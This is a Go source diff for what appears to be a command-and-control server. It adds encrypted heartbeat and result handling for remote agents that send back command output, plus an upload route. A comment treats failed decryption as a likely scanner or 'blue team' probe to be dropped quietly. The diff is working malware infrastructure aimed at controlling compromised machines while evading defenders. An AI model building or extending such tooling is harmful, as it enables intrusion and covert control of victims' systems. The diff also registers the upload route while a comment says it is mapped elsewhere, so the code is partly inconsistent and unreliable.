@@ -3,6 +3,7 @@ package main
 import (
 	"encoding/json"
 	"fmt"
+	"io"
 	"net/http"
 	"sync"
 	"time"
@@ -40,6 +41,9 @@ func StartHTTPListener(port string) {
 
 	http.HandleFunc("/heartbeat", handleHeartbeat)
 	http.HandleFunc("/result", handleResult)
+	http.HandleFunc("/upload", handleFileUpload)
+	// Assuming you have an upload handler mapped elsewhere,
+	// e.g., in main.go: http.HandleFunc("/upload", handleFileUpload)
 
 	fmt.Printf("[+] HTTP Listener started on port %s...\n", port)
 	if err := http.ListenAndServe(":"+port, nil); err != nil {
@@ -54,9 +58,27 @@ func handleHeartbeat(w http.ResponseWriter, r *http.Request) {
 		return
 	}
 
-	var reqAgent Agent
-	if err := json.NewDecoder(r.Body).Decode(&reqAgent); err != nil {
+	// 1. Read the encrypted raw body
+	bodyBytes, err := io.ReadAll(r.Body)
+	if err != nil {
+		http.Error(w, "Cannot read body", http.StatusBadRequest)
+		return
+	}
+	defer r.Body.Close()
+
+	// 2. [SECURITY] Decrypt the incoming data
+	decryptedString, err := Decrypt(string(bodyBytes))
+	if err != nil {
+		// If decryption fails, it might be a scanner or blue team. Drop quietly.
+		// fmt.Printf("[-] Invalid Crypto/Heartbeat attempt from %s\n", r.RemoteAddr)
 		http.Error(w, "Bad Request", http.StatusBadRequest)
+		return
+	}
+
+	// 3. Unmarshal the decrypted JSON
+	var reqAgent Agent
+	if err := json.Unmarshal([]byte(decryptedString), &reqAgent); err != nil {
+		http.Error(w, "Bad JSON", http.StatusBadRequest)
 		return
 	}
 
@@ -98,8 +120,17 @@ func handleHeartbeat(w http.ResponseWriter, r *http.Request) {
 	}
 	AgentsMutex.Unlock()
 
-	w.Header().Set("Content-Type", "application/json")
-	json.NewEncoder(w).Encode(response)
+	// 4. [SECURITY] Encrypt the response before sending it back
+	jsonResponse, _ := json.Marshal(response)
+	encryptedResponse, err := Encrypt(string(jsonResponse))
+	if err != nil {
+		http.Error(w, "Encryption Error", http.StatusInternalServerError)
+		return
+	}
+
+	// Send encrypted payload as plain text
+	w.Header().Set("Content-Type", "text/plain")
+	w.Write([]byte(encryptedResponse))
 }
 
 // handleResult processes the command output sent by the agent
@@ -109,13 +140,29 @@ func handleResult(w http.ResponseWriter, r *http.Request) {
 		return
 	}
 
+	// 1. Read the encrypted raw body
+	bodyBytes, err := io.ReadAll(r.Body)
+	if err != nil {
+		http.Error(w, "Cannot read body", http.StatusBadRequest)
+		return
+	}
+	defer r.Body.Close()
+
+	// 2. [SECURITY] Decrypt the incoming result
+	decryptedString, err := Decrypt(string(bodyBytes))
+	if err != nil {
+		http.Error(w, "Bad Request", http.StatusBadRequest)
+		return
+	}
+
+	// 3. Unmarshal the decrypted JSON
 	var resultData struct {
 		ID     string `json:"id"`
 		Output string `json:"output"`
 	}
 
-	if err := json.NewDecoder(r.Body).Decode(&resultData); err != nil {
-		http.Error(w, "Bad Request", http.StatusBadRequest)
+	if err := json.Unmarshal([]byte(decryptedString), &resultData); err != nil {
+		http.Error(w, "Bad JSON", http.StatusBadRequest)
 		return
 	}
 
